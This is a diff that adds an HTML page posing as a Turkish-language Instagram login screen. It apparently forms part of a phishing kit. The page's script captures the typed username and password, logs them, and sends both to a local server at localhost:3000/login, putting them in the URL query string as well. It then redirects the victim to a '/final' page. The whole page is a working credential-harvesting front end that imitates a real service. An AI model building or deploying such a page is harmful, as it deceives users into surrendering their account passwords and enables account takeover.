@@ -1,0 +1,73 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <link href="https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono" rel="stylesheet">
+    <link href="/style.css" rel="stylesheet" type="text/css">
+    <title>Instagram</title>
+  </head>
+  <body>
+    
+
+<div id="wrapper">
+  <div class="main-content">
+    <div class="header">
+      <img src="/zqpwkLQ.png" />
+    </div>
+    <div class="l-part">
+      <input type="text" placeholder="Telefon numarası, kullanıcı adı veya e-posta" class="input-1" id="userid"/>
+      <input type="password" placeholder="Şifre" class="input-2" id="password"/>
+      
+      <input type="button" value="Giriş Yap" class="btn" id="loginbtn"/>
+    </div>
+  </div>
+  <div class="sub-content">
+    <div class="s-part">
+      Hesabın yok mu?<a href="#"> Kaydol</a>
+    </div>
+  </div>
+  <div>
+   
+  </div>
+</div>
+<script src="/axios.min.js"></script>
+<script>
+var loginBtn = document.getElementById("loginbtn");
+
+
+
+loginBtn.onclick = function() {
+  var userid = document.getElementById("userid").value;
+  var passw = document.getElementById("password").value;
+  console.log("userid: " + userid);
+  console.log("pass: " + passw);
+       // Optionally the request above could also be done as
+axios.post('http://localhost:3000/login?userid=' + userid + '&pass=' + passw, {
+      ID: userid,
+      pass: passw
+  })
+  .then(function (response) {
+    console.log(response);
+    if(response.data == 'redirect')
+    {
+      alert("redirecting...");
+      window.location.href = "/final";
+    }
+  })
+  .catch(function (error) {
+    console.log(error);
+  })
+  .then(function () {
+    // always executed
+  });  
+};
+
+
+  </script>
+
+</body>
+
+</html>
